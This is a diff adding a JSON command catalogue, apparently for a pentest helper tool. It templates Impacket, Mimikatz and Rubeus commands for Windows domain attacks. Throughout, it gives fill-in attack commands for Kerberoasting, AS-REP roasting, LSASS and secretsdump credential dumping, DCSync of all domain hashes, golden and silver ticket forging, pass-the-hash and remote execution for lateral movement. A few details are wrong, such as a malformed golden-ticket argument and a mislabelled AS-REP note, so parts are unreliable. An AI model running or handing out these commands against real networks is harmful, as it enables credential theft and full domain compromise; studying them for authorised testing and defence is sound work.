@@ -1,0 +1,900 @@
+{
+    "impacketCommands": {
+        "display": "Impacket commands",
+        "commands": {
+            "impacketKerberoasting": {
+                "display": "Kerberoasting",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD>",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With password (saving hashes to output file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <OUTPUT_FILE>",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"OUTPUT_FILE": {"display": "Output File (not mandatory)", "type": "text"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME>",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash (saving hashes to output file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -outputfile <OUTPUT_FILE>",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"OUTPUT_FILE": {"display": "Output File (not mandatory)", "type": "text"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "impacketASREPRoasting": {
+                "display": "AS-REP Roasting",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -format hashcat",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With password (saving hashes to output file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -format hashcat -outputfile <OUTPUT_FILE>",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"OUTPUT_FILE": {"display": "Output File (not mandatory)", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -format hashcat",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash (saving hashes to output file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -format hashcat -outputfile <OUTPUT_FILE>",
+                                "requirements": [
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}},
+                                    {"OUTPUT_FILE": {"display": "Output File (not mandatory)", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "credentialsDumping": {
+                "display": "Credentials dumping",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -dc-ip <DC_IP> -history",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output is hashed in LM:NTLM, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With password (saving hashes to output file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -dc-ip <DC_IP> -history -outputfile <OUTPUT_FILE>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"OUTPUT_FILE": {"display": "Output File (not mandatory)", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output is hashed in LM:NTLM, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -dc-ip <DC_IP> -history -hashes :<NTLM>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output is hashed in LM:NTLM, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash (saving hashes to output file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -dc-ip <DC_IP> -history -hashes :<NTLM> -outputfile <OUTPUT_FILE>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
+                                    {"OUTPUT_FILE": {"display": "Output File (not mandatory)", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output is hashed in LM:NTLM, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "silverTicketGeneration": {
+                "display": "Silver tickets generation",
+                "commands": [
+                    {
+                        "display": "Silver tickets generation",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-ticketer -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SPN> <USERNAME>",
+                                "requirements": [
+                                    {"NTHASH": {"display": "Signing hash (service)", "type": "text"}},
+                                    {"DOMAIN_SID": {"display": "Domain SID", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"SPN": {"display": "SPN", "type": "text"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}}
+                                ]
+                            },
+                            {
+                                "command": "From terminal: export KRB5CCNAME=/root/impacket-examples/<USERNAME>.ccache",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}}
+                                ]
+                            },
+                            {
+                                "command": "Now you have the ticket loaded, you can interact with the service",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "goldenTicketGeneration": {
+                "display": "Golden ticket generation",
+                "commands": [
+                    {
+                        "display": "Golden ticket generation",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-ticketer -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>",
+                                "requirements": [
+                                    {"NTHASH": {"display": "Signing hash (KDC/krbtgt)", "type": "text"}},
+                                    {"DOMAIN_SID": {"display": "Domain SID", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}}
+                                ]
+                            },
+                            {
+                                "command": "From terminal: export KRB5CCNAME=/root/impacket-examples/<USERNAME>.ccache",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}}
+                                ]
+                            },
+                            {
+                                "command": "Now you have the ticket loaded, you can use your TGT",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "ticketConversion": {
+                "display": "Ticket conversion",
+                "commands": [
+                    {
+                        "display": "Convert ticket from Windows to UNIX format",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-ticketConverter <KIRBI_TICKET> <CCACHE_TICKET>",
+                                "requirements": [
+                                    {"KIRBI_TICKET": {"display": "Kirbi ticket name", "type": "text"}},
+                                    {"CCACHE_TICKET": {"display": "CCache ticket name", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Convert ticket from UNIX to Windows format",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-ticketConverter <CCACHE_TICKET> <KIRBI_TICKET>",
+                                "requirements": [
+                                    {"CCACHE_TICKET": {"display": "CCache ticket name", "type": "text"}},
+                                    {"KIRBI_TICKET": {"display": "Kirbi ticket name", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "psExecLateralMovement": {
+                "display": "Lateral movement with PsExec",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "smbExecLateralMovement": {
+                "display": "Lateral movement with SMBExec",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "wmiExecLateralMovement": {
+                "display": "Lateral movement with WMIExec",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "ntlmRelayPivoting": {
+                "display": "Pivoting with NTLMRelay",
+                "commands": [
+                    {
+                        "display": "Pivoting with NTLMRelay",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-ntlmrelayx -t <TARGET_IP> -c '<COMMAND>'",
+                                "requirements": [
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"COMMAND": {"display": "Command", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mssqlClient": {
+                "display": "MSSQL Server connection",
+                "commands": [
+                    {
+                        "display": "With password:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "With hash:",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-mssqlclient <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "smbClient": {
+                "display": "SMB Server interaction",
+                "commands": [
+                    {
+                        "display": "List shares (NULL user):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbclient --no-pass -L //<TARGET_IP>",
+                                "requirements": [
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "List shares (with password):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<PASSWORD>' -L //<TARGET_IP>",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "List shares (with hash):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<NTLM>' --pw-nt-hash -L //<TARGET_IP>",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Connect to share (NULL user):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbclient -N //<TARGET_IP>/<SHARE>",
+                                "requirements": [
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"SHARE": {"display": "Share", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Connect to share (with password):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<PASSWORD>' //<TARGET_IP>/<SHARE>",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"PASSWORD": {"display": "Password", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"SHARE": {"display": "Share", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Connect to share (with hash):",
+                        "commands": [
+                            {
+                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<NTLM>' --pw-nt-hash //<TARGET_IP>/<SHARE>",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}},
+                                    {"TARGET_IP": {"display": "Target IP", "type": "text"}},
+                                    {"SHARE": {"display": "Share", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            }
+        }
+    },
+    "mimikatzCommands": {
+        "display": "Mimikatz commands",
+        "commands": {
+            "mimikatzMemCreds": {
+                "display": "Extract memory-stored credentials",
+                "commands": [
+                    {
+                        "display": "Extract from victim's OS",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Extract from victim's OS (saving output to file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > <OUTPUT>",
+                                "requirements": [
+                                    {"OUTPUT": {"display": "Output file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Extract from lsass.exe dump:",
+                        "commands": [
+                            {
+                                "command": "Dump the lsass.exe process with Sysinternals ProcDump or Windows Task Manager",
+                                "requirements": []
+                            },
+                            {
+                                "command": "From terminal: mimikatz.exe sekurlsa::minidump <DUMP> sekurlsa::logonpasswords exit",
+                                "requirements": [
+                                    {"DUMP": {"display": "Dump file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Extract from lsass.exe dump (saving output to file):",
+                        "commands": [
+                            {
+                                "command": "Dump the lsass.exe process with Sysinternals ProcDump or Windows Task Manager",
+                                "requirements": []
+                            },
+                            {
+                                "command": "From terminal: mimikatz.exe sekurlsa::minidump <DUMP> sekurlsa::logonpasswords exit > <OUTPUT>",
+                                "requirements": [
+                                    {"DUMP": {"display": "Dump file", "type": "text"}},
+                                    {"OUTPUT": {"display": "Output file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzAccourateCreds": {
+                "display": "Accourate credentials extraction",
+                "commands": [
+                    {
+                        "display": "TSPKG Credentials:",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe sekurlsa::tspkg log full exit",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "TSPKG Credentials (saving output to file):",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe sekurlsa::tspkg log full exit > <OUTPUT>",
+                                "requirements": [
+                                    {"OUTPUT": {"display": "Output file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "WDigest credentials:",
+                        "commands": [
+                            {
+                                "command": "Dump the lsass.exe process with Sysinternals ProcDump or Windows Task Manager",
+                                "requirements": []
+                            },
+                            {
+                                "command": "From terminal: mimikatz.exe sekurlsa::wdigest <DUMP> exit",
+                                "requirements": [
+                                    {"DUMP": {"display": "Dump file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "WDigest credentials (saving output to file):",
+                        "commands": [
+                            {
+                                "command": "Dump the lsass.exe process with Sysinternals ProcDump or Windows Task Manager",
+                                "requirements": []
+                            },
+                            {
+                                "command": "From terminal: mimikatz.exe sekurlsa::wdigest <DUMP> exit > <OUTPUT>",
+                                "requirements": [
+                                    {"DUMP": {"display": "Dump file", "type": "text"}},
+                                    {"OUTPUT": {"display": "Output file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzSilverTicketGeneration": {
+                "display": "Silver tickets generation",
+                "commands": [
+                    {
+                        "display": "Silver tickets generation",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'kerberos::golden /domain:<DOMAIN> /sid:<SID> /rc4:<NTHASH> /user:<USERNAME> /service:<SERVICE_NAME> /target:<TARGET>' exit",
+                                "requirements": [
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"SID": {"display": "Domain SID", "type": "text"}},
+                                    {"NTHASH": {"display": "Signing hash (service)", "type": "text"}},
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"SERVICE_NAME": {"display": "Service name", "type": "text"}},
+                                    {"TARGET": {"display": "Target domain name", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "From terminal: mimikatz.exe 'kerberos::ptt ticket.kirbi' exit",
+                                "requirements": []
+                            },
+                            {
+                                "command": "Now you have the ticket loaded, you can interact with the service",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzGoldenTicketGeneration": {
+                "display": "Golden ticket generation",
+                "commands": [
+                    {
+                        "display": "Golden ticket generation",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'kerberos::golden /user:<USERNAME> /domain:<TARGET> /sid:<SID> krbtgt:<NTHASH> /ptt' exit",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"TARGET": {"display": "Target domain name", "type": "text"}},
+                                    {"SID": {"display": "Domain SID", "type": "text"}},
+                                    {"NTHASH": {"display": "Signing hash (KDC/krbtgt)", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "Now you have the ticket loaded, you can use your TGT",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzPassTheHash": {
+                "display": "Pass the hash",
+                "commands": [
+                    {
+                        "display": "Pass the hash",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM>' exit",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzPassTheTicket": {
+                "display": "Pass the ticket",
+                "commands": [
+                    {
+                        "display": "Pass the ticket",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'kerberos::ptt <TICKET>' exit",
+                                "requirements": [
+                                    {"TICKET": {"display": "Ticket file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzPrivilegeEscalation": {
+                "display": "Privilege escalation",
+                "commands": [
+                    {
+                        "display": "Token gathering",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe token::whoami exit",
+                                "requirements": []
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Privilege escalation with the previous token",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'token::elevation /token:<TOKEN>' exit",
+                                "requirements": [
+                                    {"TOKEN": {"display": "Token gathered from the token gathering command (click generate with blank token)", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "mimikatzDCSync": {
+                "display": "DCSync",
+                "commands": [
+                    {
+                        "display": "Retrieve single user:",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /user:<USER>' exit",
+                                "requirements": [
+                                    {"DC": {"display": "Domain controller", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
+                                    {"USER": {"display": "User to retrieve", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    },
+                    {
+                        "display": "Retrieve all:",
+                        "commands": [
+                            {
+                                "command": "From terminal: mimikatz.exe 'lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /all /csv' exit",
+                                "requirements": [
+                                    {"DC": {"display": "Domain controller", "type": "text"}},
+                                    {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            }
+        }
+    },
+    "rubeusCommands": {
+        "display": "Rubeus commands",
+        "commands": {
+            "rubeusPassTheHash": {
+                "display": "Pass the hash",
+                "commands": [
+                    {
+                        "display": "Pass the hash",
+                        "commands": [
+                            {
+                                "command": "From terminal: .\\Rubeus.exe pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM>",
+                                "requirements": [
+                                    {"USERNAME": {"display": "Username", "type": "autocomplete"}},
+                                    {"DOMAIN": {"display": "Domain", "type": "select"}},
+                                    {"NTLM": {"display": "NTLM Hash", "type": "server"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "rubeusPassTheTicket": {
+                "display": "Pass the ticket",
+                "commands": [
+                    {
+                        "display": "Pass the ticket",
+                        "commands": [
+                            {
+                                "command": "From terminal: .\\Rubeus.exe ptt /ticket:<TICKET>",
+                                "requirements": [
+                                    {"TICKET": {"display": "Ticket file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "rubeusKerberoasting": {
+                "display": "Kerberoasting",
+                "commands": [
+                    {
+                        "display": "Kerberoasting",
+                        "commands": [
+                            {
+                                "command": "From terminal: .\\Rubeus.exe kerberoast /outfile:<OUTPUT>",
+                                "requirements": [
+                                    {"OUTPUT": {"display": "Output file", "type": "text"}}
+                                ]
+                            },
+                            {
+                                "command": "The output tickets are ciphered with the service account password NTML hash, crack it with hashcat.",
+                                "requirements": []
+                            }
+                        ]
+                    }
+                ]
+            },
+            "rubeusASREPRoasting": {
+                "display": "AS-REP Roasting",
+                "commands": [
+                    {
+                        "display": "AS-REP Roasting",
+                        "commands": [
+                            {
+                                "command": "From terminal: .\\Rubeus.exe asreproast /format:hashcat /outfile:<OUTPUT>",
+                                "requirements": [
+                                    {"OUTPUT": {"display": "Output file", "type": "text"}}
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            }
+        }
+    }
+}
